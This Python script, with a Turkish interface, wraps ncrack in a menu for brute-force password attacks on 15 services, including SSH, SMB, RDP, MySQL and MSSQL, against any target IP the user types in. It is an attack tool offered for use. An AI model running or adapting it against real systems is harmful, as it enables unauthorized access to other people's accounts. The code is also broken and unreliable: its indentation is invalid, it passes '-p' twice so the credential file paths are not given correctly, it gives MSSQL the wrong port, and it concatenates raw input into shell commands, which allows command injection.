#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet BHECY")
os.system("figlet KABA KUVVET SALDIRI")

print("""
KABA KUVVET SALDIRI aracina HosGeldin hacker dayi :)

1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) RPC
7) SIP
8) Redis
9) VNC
10) PostgreSQL
11) MySQL
12) MSSQL
13) WhoIS
14) NetBIOS
15) Remote Desktop MS
 """)
 
 islemno= input("islem no giriniz : ")
 hedefip= input("hedef ip giriniz :")
 kullaniciadi= input("Kullanıcı adı dosya yolunu giriniz :")
 sifre= input("Şifre dosya yolunu giriniz :")
 
 if islemno=="1":
	os.system("ncrack -p 21 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="2":
	os.system("ncrack -p 22 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="3":
	os.system("ncrack -p 23 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="4":
	os.system("ncrack -p 80 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="5":
	os.system("ncrack -p 445 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="6":
	os.system("ncrack -p 135 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="7":
	os.system("ncrack -p 5060 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="8":
	os.system("ncrack -p 6379 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="9":
	os.system("ncrack -p 5900 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="10":
	os.system("ncrack -p 5432 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="11":
	os.system("ncrack -p 3306 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="12":
	os.system("ncrack -p 1443 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="13":
	os.system("ncrack -p 43 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="14":
	os.system("ncrack -p 139 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
 elif islemno=="15":
	os.system("ncrack -p 3389 -u "+kullaniciadi+" -p "+sifre+" "+hedefip)
else:
	print("yanlış seçim yaptın...")
  
 